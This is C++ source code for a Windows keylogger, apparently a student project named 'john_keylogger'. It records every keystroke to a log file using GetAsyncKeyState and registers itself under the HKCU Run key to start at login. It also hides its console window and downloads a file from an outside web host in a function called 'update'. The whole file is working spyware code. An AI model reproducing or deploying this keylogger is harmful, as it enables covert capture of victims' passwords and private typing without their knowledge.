#include <windows.h>
#include <iostream>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <stdlib.h>
#include <winuser.h>
#include <tchar.h>  //update
#include <urlmon.h> //update
//#include <stdafx.h> //update

#pragma comment(lib, "urlmon.lib") //update
#pragma comment(lib, "advapi32.lib") //autostart
#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "User32.lib")

int Save (int key_stroke, char *file);
int autostart();
void Stealth();
void update();

char szRunKey[] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Run"};
char szMyAppPath[] = { "C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\john_keylogger.exe" };
//char szMyAppPath[] = {"C:\\Windows\\system32\\calc.exe"};
char szMyappSubKey[] = {"CSC432"};

int main()
{
autostart();
Stealth();
update();
char i;

	while (1)
	{
		for(i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			Save (i, "KeyLog.txt");
		}
	}
	return 0;
}

int Save (int key_stroke, char *file)
{
	if ( (key_stroke ==1) || (key_stroke == 2) )
		return 0;
		
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	std::cout << key_stroke << "\n";

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose (OUTPUT_FILE);
	return 0;
}

int autostart(void)
{
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		if(RegSetValueEx(hKey, szMyappSubKey, 0,
				REG_SZ, (const unsigned char*)szMyAppPath,
				sizeof(szMyAppPath)) == ERROR_SUCCESS)
			puts("Create Run key successful");
		else
			puts("RegSetValueEx failed");
		
		RegCloseKey(hKey);
	}
	else
		puts("RegOpenKeyEx key failed");
	
	return 0;
}

/*void autostart()
{
	CopyFile("john_keylogger.exe","C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\john_keylogger.exe",0);
}*/

void Stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}

void update()
{
	HRESULT hr;
	LPCTSTR Url = _T("willkenyon.com/wp-content/uploads/2013/06/u-mad-bro.jpg"), File = _T("C:\\Documents and Settings\\john\\Desktop\\u-mad-bro.jpg");
//download pic
	hr = URLDownloadToFile (0, Url, File, 0, 0);
	switch (hr)
	{
		case S_OK:
			std::cout << "Successful download\n";
			break;
		case E_OUTOFMEMORY:
			std::cout << "Out of memory error\n";
			break;
		case INET_E_DOWNLOAD_FAILURE:
			std::cout << "Cannot access server date\n";
			break;
		default:
			std::cout << "Unknown error\n";
			break;
	}
	printf("%x", hr);
}
